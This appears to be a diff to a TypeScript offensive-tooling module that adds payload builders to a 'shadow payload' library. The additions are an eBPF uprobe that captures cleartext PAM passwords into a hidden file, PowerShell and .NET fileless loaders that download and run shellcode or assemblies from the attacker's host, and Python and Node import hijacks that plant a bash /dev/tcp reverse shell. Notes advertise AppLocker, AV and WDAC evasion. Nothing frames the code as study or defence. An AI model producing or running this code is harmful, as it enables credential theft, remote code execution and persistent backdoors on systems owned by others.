@@ -279,3 +279,80 @@ export function buildAllShadowPayloads(lhost: string, lport: string): ShadowPayl
     ...buildGoRustDroppers(lhost, lport),
   ];
 }
+
+export function buildEbpfBackdoor(lhost: string, lport: string): ShadowPayload[] {
+  return [
+    { id:"ebpf_uprobe_pam", name:"eBPF uprobe PAM password interceptor", category:"eBPF-Rootkit",
+      os:"linux", stealth:5, requires:["root","python3-bcc"],
+      command:`python3 -c "
+from bcc import BPF
+import ctypes as ct, os
+prog=r'''
+#include <uapi/linux/ptrace.h>
+struct data_t { u32 pid; char comm[16]; char str[128]; };
+BPF_PERF_OUTPUT(events);
+int hook_pam(struct pt_regs *ctx) {
+  struct data_t d={};
+  d.pid=bpf_get_current_pid_tgid()>>32;
+  bpf_get_current_comm(&d.comm,sizeof(d.comm));
+  bpf_probe_read_user_str(&d.str,sizeof(d.str),(void*)PT_REGS_PARM2(ctx));
+  events.perf_submit(ctx,&d,sizeof(d));
+  return 0;
+}
+'''
+b=BPF(text=prog)
+b.attach_uprobe(name='/lib/x86_64-linux-gnu/libpam.so.0',sym='pam_get_authtok',fn_name='hook_pam')
+class D(ct.Structure): _fields_=[('pid',ct.c_uint32),('comm',ct.c_char*16),('str',ct.c_char*128)]
+def pr(cpu,data,sz):
+  d=ct.cast(data,ct.POINTER(D)).contents
+  open('/tmp/.nx_creds','a').write(f'{d.comm.decode()}:{d.str.decode()}\n')
+b['events'].open_perf_buffer(pr)
+while True: b.perf_buffer_poll()
+" 2>/dev/null &`,
+      notes:"eBPF uprobe on pam_get_authtok() — intercepts cleartext passwords at PAM layer for ALL auth (SSH, sudo, login, su). Invisible to process listing." },
+  ];
+}
+
+export function buildDotNetMemoryLoader(lhost: string, lport: string): ShadowPayload[] {
+  const url = `http://${lhost}:8080`;
+  return [
+    { id:"dotnet_reflection_loader", name:".NET Assembly reflection loader (no disk)", category:"Fileless-Windows",
+      os:"windows", stealth:5, requires:["powershell","dotnet"],
+      command:`powershell -NonI -W Hidden -Exec Bypass -c "[System.Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('${url}/assembly.dll')).GetType('NX.Implant').GetMethod('Run').Invoke($null,[object[]]@('${lhost}','${lport}'))" 2>nul`,
+      notes:".NET Assembly loaded from byte array via reflection — never touches disk. Bypasses AppLocker file rules." },
+    { id:"dotnet_add_type_shellcode", name:"PowerShell Add-Type shellcode loader", category:"Fileless-Windows",
+      os:"windows", stealth:4, requires:["powershell"],
+      command:`powershell -NonI -W Hidden -Exec Bypass -c "$a=Add-Type -MemberDefinition '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr a,uint s,uint t,uint p);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr a,uint s,IntPtr p,IntPtr pa,uint f,IntPtr t);[DllImport(\"kernel32.dll\")]public static extern uint WaitForSingleObject(IntPtr h,uint m);' -Name 'NX' -Namespace 'Win32' -PassThru; $sc=(New-Object Net.WebClient).DownloadData('${url}/sc.bin'); $m=[Win32.NX]::VirtualAlloc(0,$sc.Length,0x3000,0x40); [System.Runtime.InteropServices.Marshal]::Copy($sc,0,$m,$sc.Length); [Win32.NX]::WaitForSingleObject([Win32.NX]::CreateThread(0,0,$m,0,0,0),0xFFFFFFFF)" 2>nul`,
+      notes:"Add-Type P/Invoke shellcode loader — VirtualAlloc+CreateThread. Never on disk. Bypasses file-based AV/WDAC." },
+  ];
+}
+
+export function buildImportHijacking(lhost: string, lport: string): ShadowPayload[] {
+  const cmd = `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`;
+  return [
+    { id:"python_sitecustomize_hijack", name:"Python sitecustomize.py import hijack", category:"Import-Hijack",
+      os:"linux", stealth:5, requires:["python3"],
+      command:`python3 -c "import site; print(site.getsitepackages())" 2>/dev/null | tr -d "[]'" | tr ',' '\n' | while read d; do [ -w "$d" ] && echo "import os; os.popen('${cmd} &')" >> "$d/sitecustomize.py" 2>/dev/null && echo "PLANTED in $d/sitecustomize.py" && break; done`,
+      notes:"sitecustomize.py executes on EVERY Python interpreter start — system-wide. Persists across Python upgrades." },
+    { id:"python_pth_file_hijack", name:"Python .pth site-packages code injection", category:"Import-Hijack",
+      os:"linux", stealth:5, requires:["python3"],
+      command:`_D=$(python3 -m site --user-site 2>/dev/null); mkdir -p "$_D" 2>/dev/null; echo "import os; os.popen('${cmd} &')" > "$_D/nx_site.pth" 2>/dev/null && echo "PLANTED: $_D/nx_site.pth"`,
+      notes:".pth files in site-packages with 'import' prefix execute arbitrary code on Python startup. No root needed." },
+    { id:"node_require_hook", name:"Node.js module require() hijack", category:"Import-Hijack",
+      os:"linux", stealth:5, requires:["node"],
+      command:`_NODE_MOD=$(node -e "console.log(require.resolve.paths('express')?.[0]??'')" 2>/dev/null); [ -n "$_NODE_MOD" ] && mkdir -p "$_NODE_MOD/express" && echo "require('child_process').exec('${cmd}'); module.exports=require('/usr/lib/node_modules/express');" > "$_NODE_MOD/express/index.js" && echo "NODE HOOK: express backdoored"`,
+      notes:"Injects payload into Node.js module resolution path. Any app requiring 'express' gets backdoored copy." },
+  ];
+}
+
+export function buildAllShadowPayloads(lhost: string, lport: string): ShadowPayload[] {
+  return [
+    ...buildLinuxFilelessLoaders(lhost, lport),
+    ...buildWindowsInMemoryLoaders(lhost, lport),
+    ...buildAmsiBypassChains(lhost, lport),
+    ...buildGoRustDroppers(lhost, lport),
+    ...buildEbpfBackdoor(lhost, lport),
+    ...buildDotNetMemoryLoader(lhost, lport),
+    ...buildImportHijacking(lhost, lport),
+  ];
+}
